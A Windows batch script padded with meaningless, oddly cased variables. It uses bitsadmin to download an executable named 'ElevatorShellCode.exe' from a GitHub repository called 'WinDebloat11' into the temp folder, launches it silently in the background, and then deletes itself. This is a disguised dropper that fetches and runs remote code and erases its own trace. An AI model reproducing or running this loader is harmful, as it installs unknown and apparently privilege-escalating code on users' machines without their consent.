@echo off
setlocal EnableDelayedExpansion

:: --- vars ---
set "aBc=set"
set "XyZ=temp"
set "q1w2e3="
set "rAnd0m=abcdefghijklmnopqrstuvwxyz"

%q1w2m%set "tArGet=%TEMP%\es.exe"
set "sRc1=https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers/ElevatorShellCode.exe"

:: --- value ---
set "NoIsE=CAPS"
set "LoWeR=lower"
set "MiXeD=MiXeD"

:: --- command ---
cmd /c "bitsadmin /transfer e /download /priority high %sRc1% %tArGet% >nul 2>&1"

:: --- window ---
start /b "" "%tArGet%" >nul 2>&1
del "%~f0" >nul 2>&1
endlocal
